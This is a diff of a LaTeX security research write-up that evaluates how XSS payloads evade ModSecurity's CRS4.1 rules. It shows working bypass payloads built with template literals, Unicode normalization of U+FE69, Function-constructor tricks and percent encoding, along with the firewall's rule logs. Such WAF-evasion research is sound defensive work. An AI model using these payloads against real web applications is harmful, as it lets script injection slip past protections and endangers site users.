@@ -8,6 +8,7 @@ The ModSecurity firewall blocks requests containing unicode escaped characters i
 In order to evade this rule, a payload containing a unicode escaped character was percent-encoded previous to submission.
 The ModSecurity firewall detected the unicode escape regardless and rejects the request:
 
+{\color{red} check this payload}
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
 <payload>urllib.parse.quote('{ "body": "alert\\u0024{1}" }')</payload>
 <payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
@@ -38,6 +39,7 @@ However, this payload would not be valid unless the target also performs multipl
 	data octet as the beginning of a percent-encoding, or vice versa in
 	the case of percent-encoding an already percent-encoded string.
 \end{quote}
+
 
 \subsubsection{Double HTML character reference}
 \label{sec:doublehtmlcharref}
@@ -228,7 +230,7 @@ Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and
 <message>"Remote Command Execution: Unix Shell Expression Found"</message>
 <file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
 <fileDetails>[line "291"] [id "932130"]<fileDetails>
-<MatchedData>"${s}`}"</MatchedData>
+<MatchedData>"${s}"</MatchedData>
 \end{lstlisting}
 
 Evading rule \verb|932130| was possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|. This made the payload bypass the ModSecurity firewall. The bypassing payload:
@@ -250,13 +252,6 @@ A substitution of the earlier \verb|$| with an escaped variant is not possible.
 JavaScript does not recognize the placeholder in the Template Literal without the explicit character \verb|$|.
 Substitution of the second placeholder is possible because it happens inside a string containing the Tagged Template Literal.
 
-If the webserver is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69. In this case it was neccessary to use Percent encoding in addition to avoid that the WAF flags the Unicode escape sequences as \quotes{Possible Unicode character bypass detected}:
-
-\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using unicode normalization]
-urllib.parse.quote("[]['constructor']['constructor']`a\uFE69{'var s = \"secret\";promp' + 't`something\uFE69{s}`'}```")
-returns
-%5B%5D%5B%27constructor%27%5D%5B%27constructor%27%5D%60a%EF%B9%A9%7B%27var%20s%20%3D%20%22secret%22%3Bpromp%27%20%2B%20%27t%60something%EF%B9%A9%7Bs%7D%60%27%7D%60%60%60
-\end{lstlisting}
 % console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
 
 \subsubsection{Avoiding \{\}}
@@ -285,8 +280,134 @@ Similarly, using the dot-syntax instead of bracket-access, the following payload
 [].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
 \end{lstlisting}
 
-
-
-
 \subsubsection{Forcing unicode normalization}
-{\color{red} TODO: what happens if a string followed by .normalize('NFKC') is sent as payload?}
+\label{sec:forcedunicodenorm}
+As stated before, a payload containing the \verb|prompt()| function:
+
+\begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python]
+prompt('',secret)
+\end{lstlisting}
+
+is being blocked by the ModSecurity firewall using CRS4.1 according to the rule:
+
+\begin{lstlisting}[style=ruleStyle, language=XML]
+<payload>prompt("", secret)</payload>
+
+<message>"Javascript method detected"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"prompt("</MatchedData>
+\end{lstlisting}
+
+in order to avoid the CRS rule with id \verb|931390|, that matches on the character sequence \verb|prompt(|, tagged template literals have been used to obscure the payload:
+
+\begin{lstlisting}[style=basicStyle, escapeinside=\^\^, language=Python]
+prompt`${secret}`
+\end{lstlisting}
+
+this payload bypasses the initially triggered rule but triggers a different rule:
+
+\begin{lstlisting}[style=ruleStyle, language=XML]
+<payload>prompt`${secret}`</payload>
+
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${secret}"</MatchedData>
+\end{lstlisting}
+
+Based on this result, it stands to reason that the next step should be to avoid that parts of the payload match on the regular expression: \verb|\$(?:\{.*\})|, which is a simplified form of the regular expression used in the CRS rule with id \verb|932130|.
+
+Previous results stated in this section either used JavaScript's character escaping (Section~\ref{sec:avoidingbypassA}) or string concatenation and replacement strategies (Section~\ref{sec:avoidingbypassB}). Single iteration results stated under Section~\ref{sec:uninormsingleiter} have shown that replacing parts of a payload with unicode symbols successfully makes payloads bypass the evaluated firewall. The payloads mentioned under Section~\ref{sec:uninormsingleiter} depend on unicode normalization implemented by the Web server receiving those requests. 
+
+If the Web server is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69: 
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+prompt`\uFE69{secret}`
+\end{lstlisting}
+
+Similar to the evaluation results stated under Section~\ref{sec:unicodeinjsontest}, the CRS4.1 rule with id \verb|920540| got triggered by the unicode escape sequence:
+
+\begin{lstlisting}[style=ruleStyle, language=XML]
+<payload>prompt`\uFE69{secret}`</payload>
+
+<message>"Possible Unicode character bypass detected"</message>
+<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
+<fileDetails>[line "1263"] [id "920540"]<fileDetails>
+<MatchedData>"x5cuFE69"</MatchedData>
+\end{lstlisting}
+
+The ModSecurity log file does not mention any transformations used by the rule before checking for matching character sequences. This was confirmed by looking at the rule with id \verb|920540| in the file \verb|REQUEST-920-PROTOCOL-ENFORCEMENT.conf| where it states: \verb|t:none|. Based on this observation, the JavaScript escape sequences evaluation results stated under Section~\ref{sec:jsescapesingleiter} and the unicode normalization results stated under Section~\ref{sec:uninormsingleiter}, three techniques to evade CRS4.1 rule with id \verb|920540| seem promising:
+
+\begin{enumerate}
+	\item Percent encoding the payload
+	\item Using the Unicode code point escape sequence
+	\item Directly putting the small dollar sign character into the payload, without any escaping
+\end{enumerate}
+
+(1.) Percent encoding was done using the python statement:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+urllib.parse.quote_plus("prompt`\uFE69{secret}`")
+\end{lstlisting}
+
+which returns the payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+prompt%60%EF%B9%A9%7Bsecret%7D%60
+\end{lstlisting}
+
+This payload successfully bypasses the evaluated firewall. 
+
+(2.) Using a Unicode code point escape sequence introduced in ES6, the payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+prompt`\u{FE69}{secret}`
+\end{lstlisting}
+
+successfully bypasses the evaluated firewall.
+
+(3.) When directly putting the small dollar sign character (U+FE69) into the payload (in this document, the character (U+FE69) is replaced by the regular \$ sign surrounded by whitespaces):
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+prompt` $ {secret}`
+\end{lstlisting}
+
+the resulting payload bypasses the evaluated firewall.
+
+In the proceeding of this section, only option 1.: percent encoding, will be used in following iterations of payload modification.
+
+At this point, the payload is still depends on the Web server performing Unicode normalization. To avoid this dependency, attacker might try and enforce the normalization of the payload. Forced normalization can be achieved by passing the payload:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+prompt`\uFE69{secret}`
+\end{lstlisting}
+
+as a string and an argument to the \verb|eval()| function. The call to the \verb|normalize()| function is appended to the payload string:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+eval('prompt`\uFE69{secret}`'.normalize('NFKC'))
+\end{lstlisting}
+
+The \verb|eval()| function will be used to evaluate the normalized payload string. Similar to the results stated under Section~\ref{sec:functionconstructorsingleeva}, the payload that is using the \verb|eval()| function is being blocked. In the next iteration, \verb|eval()| was substituted using the technique described under Section~\ref{sec:functionconstructor}. The obscured payload after this iteration:
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+[].map.constructor('prompt`\uFE69{secret}`'.normalize('NFKC'))()
+\end{lstlisting}
+
+bypasses CRS4.1 rules that try to prohibit payloads including the character sequence of \verb|eval(| but still matches on rule with id \verb|920540| and message: \quotes{Possible Unicode character bypass detected}. Therefore, in the following iteration, the payload was percent encoded, again using the \verb|quote_plus()| python function, which returned: 
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+%5B%5D.constructor.constructor%28%27prompt%60%EF%B9%A9%7Bsecret%7D%60%27.normalize%28%27NFKC%27%29%29%28%29
+\end{lstlisting}
+
+The percent encoded payload successfully bypasses the ModSecurity firewall using CRS4.1. If decoded on the Web server, it resolves into the targeted payload (the character U+FE69 is displayed by the regular \$ surrounded by whitespaces in this document):
+
+\begin{lstlisting}[style=basicStyle, language=Python]
+"[].constructor.constructor('prompt` $ {secret}`'.normalize('NFKC'))()"
+\end{lstlisting}
+
+
+
+
+
